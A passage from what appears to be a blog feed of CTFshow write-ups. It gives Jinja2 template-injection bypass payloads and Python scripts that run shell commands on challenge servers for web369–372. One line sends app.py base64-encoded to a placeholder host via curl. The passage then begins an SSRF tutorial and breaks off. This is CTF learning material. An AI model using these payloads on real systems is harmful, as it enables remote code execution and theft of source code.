builtin">set</span> c4<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>buil<span class="token operator">=</span>a<span class="token punctuation">,</span>tins<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#__builtins__</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c5<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>ev<span class="token operator">=</span>a<span class="token punctuation">,</span>al<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#eval</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> sc<span class="token operator">=</span>a<span class="token operator">|</span>pprint<span class="token operator">|</span>pprint<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#'   pprint filter Âú®Â≠óÁ¨¶‰∏≤‰∏ä‰ºöÂä†‰∏äÂçïÂºïÂè∑</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> lb<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#(</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> rb<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#)</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> point<span class="token operator">=</span><span class="token number">3.14</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#.</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> x<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>imp<span class="token operator">=</span>a<span class="token punctuation">,</span>ort<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>sc<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>o<span class="token operator">=</span>a<span class="token punctuation">,</span>s<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>sc<span class="token punctuation">,</span>rb<span class="token punctuation">,</span>point<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>po<span class="token operator">=</span>a<span class="token punctuation">,</span>pen<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>sc<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>en<span class="token operator">=</span>a<span class="token punctuation">,</span>v<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>sc<span class="token punctuation">,</span>rb<span class="token punctuation">,</span>point<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>rea<span class="token operator">=</span>a<span class="token punctuation">,</span>d<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>rb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment"># __import__('os').popen('env').read()</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token operator">|</span>attr<span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c3<span class="token punctuation">)</span><span class="token punctuation">(</span>c4<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c3<span class="token punctuation">)</span><span class="token punctuation">(</span>c5<span class="token punctuation">)</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#print(a.__init__.__globals__.__getitem__("__builtins__").__getitem__("eval")("__import__('os').popen('env').read()"))</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pop<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>p<span class="token operator">=</span>a<span class="token punctuation">,</span>op<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#pop </span></code></pre><ul><li>ËøôË°å‰ª£Á†Å‰ΩøÁî®Jinja2ÁöÑÊ®°ÊùøËØ≠Ê≥ïÔºåÈÄöËøáÂ≠óÂÖ∏ÂíåjoinËøáÊª§Âô®ÊûÑÈÄ†‰∫Ü‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ ‚Äúpop‚Äù„ÄÇ<code>dict(p=a, op=a)</code> ÂàõÂª∫‰∫Ü‰∏Ä‰∏™ÂåÖÂê´ÈîÆÂÄºÂØπ <code>&#123;&#39;p&#39;: a, &#39;op&#39;: a&#125;</code> ÁöÑÂ≠óÂÖ∏ÔºåÁÑ∂Âêé <code>|join</code> Â∞ÜËøô‰∫õÈîÆËøûÊé•ÊàêÂ≠óÁ¨¶‰∏≤ ‚Äúpop‚Äù„ÄÇ</li></ul><p>ÂÖ∂‰ªñÁõ∏‰ººÂéüÁêÜ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://106261e2-bcd9-4731-a15e-35ac39f86511.challenge.ctf.show/?name="</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)(24)%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set c2=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set c3=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set c4=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(c2)|attr(c3)(c4)|attr(c3)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(c2)|attr(c3)(c4)|attr(c3)(evas) %&#125;&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"h3>(.*?)&lt;/h3"</span></span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web370-ËøáÊª§‰∫ÜÊï∞Â≠ó"><a href="#web370-ËøáÊª§‰∫ÜÊï∞Â≠ó" class="headerlink" title="web370(ËøáÊª§‰∫ÜÊï∞Â≠ó)"></a>web370(ËøáÊª§‰∫ÜÊï∞Â≠ó)</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://717d6b1c-8b55-4083-b8af-52d9b0fd1eab.challenge.ctf.show/"</span><span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>        num <span class="token operator">//=</span> <span class="token number">10</span>        index <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span>    <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span>    <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span>    <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span>    <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span>    <span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span>    <span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span>    <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span>    <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span>    <span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;&#123;% set zero=one-one %&#125;&#123;% set two=one+one %&#125;&#123;% set three=one+two %&#125;&#123;% set four=two*two %&#125;&#123;% set five=three+two %&#125;&#123;% set six=three*two %&#125;&#123;% set seven=one+six %&#125;&#123;% set eight=four*two %&#125;&#123;% set nine=one+eight %&#125;&#123;% set ten=five*two %&#125;&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment"># print(payload)</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"h3>(.*?)&lt;/h3"</span></span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web371-372-Êó†ÂõûÊòæ"><a href="#web371-372-Êó†ÂõûÊòæ" class="headerlink" title="web371-372(Êó†ÂõûÊòæ)"></a>web371-372(Êó†ÂõûÊòæ)</h4><p>371‰∏çÁªô printÔºåcurl Â∏¶Â§ñ</p><p>372ËøáÊª§countÔºå‰ΩÜÊòØ‰∏çÂΩ±Âìç</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://39ebd089-1562-497f-bff2-83664f8ae528.challenge.ctf.show/"</span><span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>        num <span class="token operator">//=</span> <span class="token number">10</span>        index <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span>    <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span>    <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span>    <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span>    <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span>    <span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span>    <span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span>    <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span>    <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span>    <span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>code<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;&#123;% set zero=one-one %&#125;&#123;% set two=one+one %&#125;&#123;% set three=one+two %&#125;&#123;% set four=two*two %&#125;&#123;% set five=three+two %&#125;&#123;% set six=three*two %&#125;&#123;% set seven=one+six %&#125;&#123;% set eight=four*two %&#125;&#123;% set nine=one+eight %&#125;&#123;% set ten=five*two %&#125;&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;&#123;% set b=eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> code<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"%2b"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"h3>(.*?)&lt;/h3"</span></span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>run<span class="token punctuation">(</span><span class="token string">"__import__('os').popen('curl -F file=`base64 app.py -w 0` http://xxxxx/').read()"</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-ssrf</title>
      <link href="/2024/08/03/web%E5%85%A5%E9%97%A8-ssrf/"/>
      <url>/2024/08/03/web%E5%85%A5%E9%97%A8-ssrf/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h3><p><img src="begin.png" loading="lazy"></p><p>SSRF (ÂÖ®Áß∞ÔºöServer-Side Request Forgery:ÊúçÂä°Âô®Á´ØËØ∑Ê±Ç‰º™ÈÄ†) ÊòØ‰∏ÄÁßçÁî±ÊîªÂáªËÄÖÊûÑÈÄ†ÂΩ¢ÊàêÁî±ÊúçÂä°Á´ØÂèëËµ∑ËØ∑Ê±ÇÁöÑ‰∏Ä‰∏™ÂÆâÂÖ®ÊºèÊ¥û„ÄÇ‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÔºåSSRF ÊîªÂáªÁöÑÁõÆÊ†áÊòØ‰ªéÂ§ñÁΩëÊó†Ê≥ïËÆøÈóÆÁöÑÂÜÖÈÉ®Á≥ªÁªü„ÄÇ</p><p>Â¶ÇÂõæÔºåÊîªÂáªËÄÖ‰ªéÂ§ñÁΩëÈÄöËøá SSRF ÊîªÂáªËÆøÈóÆÂà∞ÂÜÖÁΩëÔºåÊé•ÁùÄÂØπÂÜÖÁΩëÁöÑÂ∫îÁî®Â±ïÂºÄÊîªÂáªÔºåËøô‰∫õÂ∫îÁî®ÂåÖÊã¨‰ΩÜ‰∏çÈôê‰∫é MySQLÔºåredisÔºåSMTP Á≠âÁ≠â ‚Ä¶‚Ä¶</p><p>Ê≠£ÊòØÂõ†‰∏∫ÂÆÉÊòØÁî±ÊúçÂä°Á´ØÂèëËµ∑ÁöÑÔºåÊâÄ‰ª•ÂÆÉËÉΩÂ§üËØ∑Ê±ÇÂà∞‰∏éÂÆÉÁõ∏ËøûËÄå‰∏éÂ§ñÁΩëÈöîÁ¶ªÁöÑÂÜÖÈÉ®Á≥ªÁªü„ÄÇ</p><p>SSRF ÂΩ¢ÊàêÁöÑÂéüÂõ†Â§ßÈÉΩÊòØÁî±‰∫éÊúçÂä°Á´ØÊèê‰æõ‰∫Ü‰ªéÂÖ∂‰ªñÊúçÂä°Âô®Â∫îÁî®Ëé∑ÂèñÊï∞ÊçÆÁöÑÂäüËÉΩ‰∏îÊ≤°ÊúâÂØπÁõÆÊ†áÂú∞ÂùÄÂÅöËøáÊª§‰∏éÈôêÂà∂„ÄÇÊØîÂ¶Ç‰ªéÊåáÂÆö URL Âú∞ÂùÄËé∑ÂèñÁΩëÈ°µÊñáÊú¨ÂÜÖÂÆπÔºåÂä†ËΩΩÊåáÂÆöÂú∞ÂùÄÁöÑÂõæÁâáÔºå‰∏ãËΩΩÁ≠âÁ≠â„ÄÇ</p><h4 id="SSRF-ÁöÑÂà©Áî®ÊñπÂºè"><a href="#SSRF-ÁöÑÂà©Áî®ÊñπÂºè" class="headerlink" title="SSRF ÁöÑÂà©Áî®ÊñπÂºè"></a>SSRF ÁöÑÂà©Áî®ÊñπÂºè</h4><p>SSRF Âà©Áî®Áõ∏ÂÖ≥ÁöÑÂç±Èô©ÂáΩÊï∞ÔºõSSRF ÂèØÂà©Áî®ÁöÑÂçèËÆÆÊìç‰Ωú</p><h5 id="file-get-contents-‰∏é-readfile"><a href="#file-get-contents-‰∏é-readfile" class="headerlink" title="file_get_contents() ‰∏é readfile()"></a><strong>file_get_contents() ‰∏é readfile()</strong></h5><ul><li><code>file_get_contents</code>Ëøô‰∏ÄÂáΩÊï∞ÊòØÊää **‰º†ÂÖ•ÁöÑÂèÇÊï∞(ÂèòÈáè)**ÂÜôÂÖ•Â≠óÁ¨¶‰∏≤ÔºåÂΩìÊää 